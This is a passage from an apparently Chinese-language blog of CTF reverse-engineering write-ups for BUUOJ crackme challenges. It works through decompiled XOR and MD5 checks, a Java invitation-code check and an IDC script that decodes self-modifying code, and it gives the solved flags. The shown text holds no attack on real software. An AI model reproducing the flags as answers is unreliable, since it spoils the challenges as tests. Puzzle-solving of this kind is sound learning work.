class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp+364h] [ebp-E8h]</span></span><br><span class="line">  __int16 v24; <span class="comment">// [esp+368h] [ebp-E4h]</span></span><br><span class="line">  CHAR Text[<span class="number">32</span>]; <span class="comment">// [esp+36Ch] [ebp-E0h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagRECT</span> <span class="title">Rect</span>;</span> <span class="comment">// [esp+38Ch] [ebp-C0h] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">100</span>]; <span class="comment">// [esp+39Ch] [ebp-B0h] BYREF</span></span><br><span class="line">  HDC hdc; <span class="comment">// [esp+400h] [ebp-4Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> <span class="title">Paint</span>;</span> <span class="comment">// [esp+404h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [esp+444h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [esp+448h] [ebp-4h]</span></span><br><span class="line">  LPARAM lParam; <span class="comment">// [esp+460h] [ebp+14h]</span></span><br><span class="line"></span><br><span class="line">  LoadStringA(hInstance, <span class="number">0x6A</span>u, Buffer, <span class="number">0x64</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argv &gt; <span class="number">0x111</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( argv == (<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="number">517</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)String1) &gt; <span class="number">6</span> )</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)String1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">        v5 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)String1);</span><br><span class="line">        <span class="built_in">memcpy</span>(v21, String1, v5);</span><br><span class="line">        v6 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)String1);</span><br><span class="line">        v7 = (HWND)sub_40101E(String1, v6, (LPSTR)String1);</span><br><span class="line">        MessageBoxA(v7, v10, v11, v12);</span><br><span class="line">        <span class="built_in">strcpy</span>(Str, <span class="string">&quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="keyword">sizeof</span>(v18));</span><br><span class="line">        v19 = <span class="number">0</span>;</span><br><span class="line">        v20 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcpy</span>(v14, <span class="string">&quot;SS&quot;</span>);</span><br><span class="line">        *(_DWORD *)&amp;v14[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        v15 = <span class="number">0</span>;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v8 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">        sub_401005(v14, (<span class="keyword">int</span>)Str, v8);</span><br><span class="line">        <span class="keyword">if</span> ( _strcmpi((<span class="keyword">const</span> <span class="keyword">char</span> *)String1, Str) )</span><br><span class="line">        &#123;</span><br><span class="line">          SetWindowTextA((HWND)argc, <span class="string">&quot;flag&#123;&#125;&quot;</span>);</span><br><span class="line">          MessageBoxA((HWND)argc, <span class="string">&quot;Are you kidding me?&quot;</span>, <span class="string">&quot;^_^&quot;</span>, <span class="number">0</span>);</span><br><span class="line">          ExitProcess(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(v13, &amp;unk_423030, <span class="number">0x32</span>u);</span><br><span class="line">        v9 = <span class="built_in">strlen</span>(v13);</span><br><span class="line">        sub_401005(v21, (<span class="keyword">int</span>)v13, v9);</span><br><span class="line">        MessageBoxA((HWND)argc, v13, <span class="number">0</span>, <span class="number">0x32</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      ++dword_428D54;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( argv != (<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="number">520</span> )</span><br><span class="line">        <span class="keyword">return</span> DefWindowProcA((HWND)argc, (UINT)argv, (WPARAM)envp, lParam);</span><br><span class="line">      <span class="keyword">if</span> ( dword_428D54 == <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(String, <span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">        v23 = <span class="number">0</span>;</span><br><span class="line">        v24 = <span class="number">0</span>;</span><br><span class="line">        SetWindowTextA((HWND)argc, String);</span><br><span class="line">        <span class="built_in">strcpy</span>(Text, <span class="string">&quot;Are you kidding me?&quot;</span>);</span><br><span class="line">        MessageBoxA((HWND)argc, Text, Buffer, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ++dword_428D54;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( argv == (<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="number">273</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = (<span class="keyword">unsigned</span> __int16)envp;</span><br><span class="line">    v30 = HIWORD(envp);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)envp == <span class="number">104</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      DialogBoxParamA(hInstance, (LPCSTR)<span class="number">0x67</span>, (HWND)argc, (DLGPROC)DialogFunc, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)envp != <span class="number">105</span> )</span><br><span class="line">        <span class="keyword">return</span> DefWindowProcA((HWND)argc, (UINT)argv, (WPARAM)envp, lParam);</span><br><span class="line">      DestroyWindow((HWND)argc);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( argv == (<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( argv != (<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="number">15</span> )</span><br><span class="line">      <span class="keyword">return</span> DefWindowProcA((HWND)argc, (UINT)argv, (WPARAM)envp, lParam);</span><br><span class="line">    hdc = BeginPaint((HWND)argc, &amp;Paint);</span><br><span class="line">    GetClientRect((HWND)argc, &amp;Rect);</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(Buffer);</span><br><span class="line">    DrawTextA(hdc, Buffer, v4, &amp;Rect, <span class="number">1u</span>);</span><br><span class="line">    EndPaint((HWND)argc, &amp;Paint);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先跟进<code>sub_40101E</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( CryptCreateHash(phProv, <span class="number">0x8003</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;phHash) )</span><br></pre></td></tr></table></figure><p>看到这句就知道是md5加密了</p><p>再跟进<code>sub_401005</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_401590</span><span class="params">(LPCSTR lpString, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = lstrlenA(lpString);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= lpString[i % v5];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_401005(v14, (<span class="keyword">int</span>)Str, v8);</span><br></pre></td></tr></table></figure><ul><li><code>v14 = &quot;SS&quot;</code></li><li><code>Str = &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</code></li><li><code>v8 = 32</code></li></ul><p>也就是说<code>Str</code>在异或之后与<code>String1</code>的md5结果比较</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">xor = <span class="string">&quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</span></span><br><span class="line">dexor = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xor:</span><br><span class="line">  dexor += <span class="built_in">chr</span>(<span class="built_in">ord</span>(_) ^ <span class="built_in">ord</span>(<span class="string">&quot;S&quot;</span>))</span><br><span class="line">print(dexor)</span><br></pre></td></tr></table></figure><p>得到<code>c8837b23ff8aaa8a2dde915473ce0991</code><br />md5解密结果为<code>123321</code></p><p>再跟进函数<code>DialogFunc</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">sub_401B20</span><span class="params">(HWND hDlg, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x110</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x111</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)a3 != <span class="number">1</span> &amp;&amp; (<span class="keyword">unsigned</span> __int16)a3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      EndDialog(hDlg, (<span class="keyword">unsigned</span> __int16)a3);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x202</span>:</span><br><span class="line">LABEL_6:</span><br><span class="line">      String1[dword_428C50++] = <span class="number">49</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x205</span>:</span><br><span class="line">      String1[dword_428C50++] = <span class="number">51</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x208</span>:</span><br><span class="line">      <span class="keyword">if</span> ( dword_428D58 &lt; <span class="number">3</span> )</span><br><span class="line">        ++dword_428D5C;</span><br><span class="line">      String1[dword_428C50++] = <span class="number">50</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>a2</code>一开始没太懂<br />后来看了别人的wp才知道貌似是Windows Message</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_LBUTTONUP                    0x0202</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_MBUTTONUP                    0x0208</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_RBUTTONUP                    0x0205</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-lbuttonup">https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-lbuttonup</a><br /><a href="https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-mbuttonup">https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-mbuttonup</a><br /><a href="https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-rbuttonup">https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-rbuttonup</a></p></blockquote><p>那么也就是按<code>鼠标左键, 鼠标中键, 鼠标右键, 鼠标右键, 鼠标中键, 鼠标左键</code></p><p>值得一提的是, 调用函数<code>DialogFunc</code>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DialogBoxParamA(hInstance, (LPCSTR)<span class="number">103</span>, (HWND)argc, (DLGPROC)DialogFunc, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在<code>Resource Hacker</code>中可以看到编号<code>103</code>对应着<code>About</code>对话框<br />也就是说需要在About对话框中按上述顺序点击鼠标<br /><s>不是做这道题我都不会意识到我的鼠标中键已经报废了, 最后动调改<code>String1</code>的值</s></p><blockquote><p><strong>flag{n0_Zu0_n0_die}</strong></p></blockquote><hr /><h1 id="flareon5minesweeper-championship-registration"><a class="markdownIt-Anchor" href="#flareon5minesweeper-championship-registration"></a> [FlareOn5]Minesweeper Championship Registration</h1><p>链接: <a href="https://buuoj.cn/challenges#%5BFlareOn5%5DMinesweeper%20Championship%20Registration">https://buuoj.cn/challenges#[FlareOn5]Minesweeper Championship Registration</a></p><p>Java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.JOptionPane;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InviteValidator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    String response = JOptionPane.showInputDialog(<span class="keyword">null</span>, <span class="string">&quot;Enter your invitation code:&quot;</span>, <span class="string">&quot;Minesweeper Championship 2018&quot;</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (response.equals(<span class="string">&quot;GoldenTicket2018@flare-on.com&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      JOptionPane.showMessageDialog(<span class="keyword">null</span>, <span class="string">&quot;Welcome to the Minesweeper Championship 2018!\nPlease enter the following code to the ctfd.flare-on.com website to compete:\n\n&quot;</span> + response, <span class="string">&quot;Success!&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      JOptionPane.showMessageDialog(<span class="keyword">null</span>, <span class="string">&quot;Incorrect invitation code. Please try again next year.&quot;</span>, <span class="string">&quot;Failure&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag写脸上了</p><blockquote><p><strong>flag{GoldenTicket2018@flare-on.com}</strong></p></blockquote><hr /><h1 id="网鼎杯-2020-青龙组jocker"><a class="markdownIt-Anchor" href="#网鼎杯-2020-青龙组jocker"></a> [网鼎杯 2020 青龙组]jocker</h1><p>链接: <a href="https://buuoj.cn/challenges#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker">https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]jocker</a></p><p>EXE 32</p><p>主函数看到对函数进行异或就知道不对劲了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x00401500</span>;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">186</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i, Byte(addr+i)^<span class="number">0x41</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体步骤参照这里<br /><a href="http://yoloyolo.top/2021/05/31/Reverse-3/#gwctf-2019re3">http://yoloyolo.top/2021/05/31/Reverse-3/#gwctf-2019re3</a><br />函数<code>finally</code>的前一部分也有被异或过, 需要重新定义为函数</p><p>函数<strong>main</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">50</span>]; <span class="comment">// [esp+12h] [ebp-96h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> Destination[<span class="number">80</span>]; <span class="comment">// [esp+44h] [ebp-64h] BYREF</span></span><br><span class="line">  DWORD flOldProtect; <span class="comment">// [esp+94h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> v7; <span class="comment">// [esp+98h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input you flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !VirtualProtect(encrypt, <span class="number">0xC8</span>u, <span class="number">4u</span>, &amp;flOldProtect) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%40s&quot;</span>, Str);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">if</span> ( v7 != <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, Str);</span><br><span class="line">  wrong(Str);</span><br><span class="line">  omg(Str);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( encrypt(Destination) )</span><br><span class="line">    finally(Destination);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进函数<code>wrong</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">wrong</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = &amp;a1[i];</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      a1[i] -= i;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      a1[i] ^= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的加密<br />继续看函数<code>omg</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">omg</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2[<span class="number">24</span>]; <span class="comment">// [esp+18h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+78h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+7Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  qmemcpy(v2, dword_4030C0, <span class="keyword">sizeof</span>(v2));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != v2[i] )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;hahahaha_do_you_find_me?&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;wrong ~~ But seems a little program&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">_4030C0 = [</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7F</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x64</span>, </span><br><span class="line"><span class="number">0x3B</span>, <span class="number">0x56</span>, <span class="number">0x6B</span>, <span class="number">0x61</span>, <span class="number">0x7B</span>, <span class="number">0x26</span>, <span class="number">0x3B</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x5F</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x71</span>, <span class="number">0x0C</span>, <span class="number">0x37</span>, <span class="number">0x66</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(_4030C0)):</span><br><span class="line">  <span class="keyword">if</span> _ % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">    flag += <span class="built_in">chr</span>(_4030C0[_] ^ _)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    flag += <span class="built_in">chr</span>(_4030C0[_] + _)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到<code>flag&#123;fak3_alw35_sp_me!!&#125;</code><br />然而是个假flag</p><p>继续看函数<code>encrypt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">encrypt</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2[<span class="number">19</span>]; <span class="comment">// [esp+1Ch] [ebp-6Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+68h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  qmemcpy(v2, dword_403040, <span class="keyword">sizeof</span>(v2));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">18</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span>)(a1[i] ^ Buffer[i]) != v2[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wrong ~&quot;</span>);</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;come 